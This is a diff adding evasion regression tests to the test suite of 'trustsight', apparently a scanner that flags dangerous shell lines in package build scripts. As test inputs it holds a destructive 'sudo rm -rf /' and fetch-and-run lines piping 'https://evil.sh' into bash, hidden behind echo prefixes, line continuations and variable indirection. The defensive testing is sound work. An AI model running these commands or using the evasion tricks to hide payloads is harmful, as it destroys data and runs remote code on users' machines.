@@ -1,3 +1,4 @@
+from trustsight.tokenizer import tokenize_and_resolve
 from trustsight.rules import apply_rules, get_raw_diff_lines
 
 FULL_RULES = [
@@ -335,3 +336,67 @@ def test_url_in_source_with_pipe_not_flagged():
     triggered = apply_rules([], ['source=("https://example.com/pkg.tar.gz")'], FULL_RULES)
     # This should NOT trigger R001 (no pipe) and NOT trigger R006 (no pipe to tar)
     assert not any(r["rule_id"] == "R001" for r in triggered)
+
+
+# --- Evasion regressions ---
+#
+# Each of these bypassed detection before the scoping, continuation, and
+# variable-resolution fixes.  They assert the payload is still seen, and
+# that the benign shape each one imitates stays quiet.
+
+def test_message_prefix_does_not_disable_scoped_rules():
+    # `echo "x"; sudo ...` scored 0 where bare `sudo ...` scored 40: the
+    # whole line was treated as an inert message.
+    for prefix in ('echo "x"; ', "printf 'x'; ", "msg 'x'; "):
+        triggered = apply_rules(
+            [], ["+build() {", f"+  {prefix}sudo rm -rf /", "+}"], FULL_RULES
+        )
+        assert any(r["rule_id"] == "R009" for r in triggered), prefix
+
+
+def test_command_substitution_in_message_is_not_inert():
+    triggered = apply_rules(
+        [], ["+build() {", '+  echo "$(curl -s https://evil.sh)"', "+}"], FULL_RULES
+    )
+    assert any(r["rule_id"] == "R010" for r in triggered)
+
+
+def test_plain_message_line_is_still_inert():
+    triggered = apply_rules([], ["+build() {", '+  echo "run sudo later"', "+}"], FULL_RULES)
+    assert not any(r["rule_id"] == "R009" for r in triggered)
+
+
+def test_line_continuation_does_not_split_pipeline():
+    diff = "+build() {\n+  curl \\\n+    https://evil.sh | bash\n+}\n"
+    resolved, _ = tokenize_and_resolve(diff)
+    triggered = apply_rules(resolved, get_raw_diff_lines(diff), FULL_RULES)
+    assert any(r["rule_id"] == "R001" for r in triggered)
+
+
+def test_indented_assignment_resolves():
+    # Every assignment inside a function body is indented, so anchoring the
+    # assignment pattern at ^ left the variable table empty exactly where
+    # it mattered.
+    diff = "+build() {\n+  C=curl\n+  $C https://evil.sh | bash\n+}\n"
+    resolved, _ = tokenize_and_resolve(diff)
+    assert any("curl https://evil.sh | bash" in line for line in resolved)
+
+
+def test_declared_assignment_resolves():
+    diff = "+build() {\n+  local C=curl\n+  $C https://evil.sh | bash\n+}\n"
+    resolved, _ = tokenize_and_resolve(diff)
+    assert any("curl https://evil.sh | bash" in line for line in resolved)
+
+
+def test_one_line_function_body_is_function_context():
+    triggered = apply_rules([], ["+build() { curl -s https://evil.sh; }"], FULL_RULES)
+    assert any(r["rule_id"] == "R010" for r in triggered)
+
+
+def test_one_line_function_does_not_leak_context():
+    # The depth counter used to stay raised after a same-line close, so
+    # everything below inherited function_body scope.
+    triggered = apply_rules(
+        [], ["+build() { echo hi; }", "+sudo_note=1"], FULL_RULES
+    )
+    assert not any(r["rule_id"] == "R009" for r in triggered)
